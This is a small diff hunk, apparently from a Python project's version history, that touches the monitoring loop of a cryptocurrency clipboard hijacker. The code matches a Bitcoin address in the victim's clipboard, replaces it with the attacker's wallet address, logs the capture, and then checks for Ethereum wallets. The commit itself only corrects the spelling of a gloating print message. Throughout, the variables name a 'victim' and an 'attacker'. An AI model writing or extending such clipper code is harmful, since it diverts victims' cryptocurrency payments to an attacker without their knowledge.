@@ -67,7 +67,7 @@ def monitorear():
         #3 => Comparar portapapeles con reglas de BTC
         if mi_patron_btc.match(victima_portapapeles):
             pc.copy(settings.atacante_wallet_btc)
-            print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
+            print("🚨 Encontrado Wallet Bitcoin. Remplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "Wallet BTC")
 
         #Chequear Wallet ETH
